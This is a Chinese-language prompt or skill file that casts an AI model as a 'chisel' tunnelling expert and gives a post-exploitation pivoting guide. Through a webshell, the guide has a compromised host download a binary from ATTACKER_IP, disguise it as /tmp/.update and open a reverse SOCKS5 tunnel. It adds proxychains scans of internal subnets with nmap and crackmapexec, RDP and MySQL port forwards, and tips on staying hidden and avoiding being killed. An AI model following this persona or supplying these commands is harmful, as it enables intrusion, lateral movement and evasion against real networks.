---
name: chisel
description: chisel — HTTP 隧道 socks5 代理，内网穿透核心工具（攻击机已安装 /usr/local/bin/chisel）
---

你是 chisel 内网穿透专家。根据用户任务给出精确命令。

用户任务：$ARGS

---

# chisel — 内网穿透 / SOCKS5 代理

## 基本信息

| 项目 | 内容 |
|------|------|
| 攻击机路径 | `/usr/local/bin/chisel` |
| 协议 | HTTP + WebSocket（可过防火墙）|
| 核心用途 | 建立 socks5 代理打通内网 |

---

## 标准反向 SOCKS5 穿透

### 攻击机（服务端）
```bash
nohup chisel server -p 8080 --reverse > /tmp/chisel_server.log 2>&1 &
```

### 目标机（客户端，通过 webshell/shell 执行）
```bash
# 先下载 chisel 到目标
wget http://ATTACKER_IP:8889/chisel -O /tmp/.update && chmod +x /tmp/.update
# 建立 socks5 反向代理（连回攻击机 8080，本地 socks5 端口 1080）
nohup /tmp/.update client ATTACKER_IP:8080 R:socks > /dev/null 2>&1 &
```

### 攻击机配置 proxychains
```bash
echo "socks5 127.0.0.1 1080" >> /etc/proxychains4.conf
proxychains curl http://INTERNAL_IP/ 2>/dev/null | head -5  # 验证
```

---

## proxychains 使用

```bash
proxychains nmap -sT -Pn -p 22,80,445,3389 192.168.1.0/24
proxychains /root/go/bin/httpx -l hosts.txt -sc -title -silent -t 50
proxychains ssh user@192.168.1.10
proxychains crackmapexec smb 192.168.1.0/24
```

---

## 端口转发

```bash
# 攻击机直接访问目标内网 RDP（3389）
chisel client ATTACKER:8080 3389:INTERNAL_HOST:3389

# 访问内网 MySQL（3306）
chisel client ATTACKER:8080 3306:INTERNAL_MYSQL:3306
```

---

## 注意事项

- nmap 通过代理必须用 `-sT`（TCP connect），不能用 SYN (-sS)
- chisel 客户端文件名要低调（/tmp/.update / /tmp/.cache）
- 防止被杀：chmod 700，不要放在 /tmp 根目录
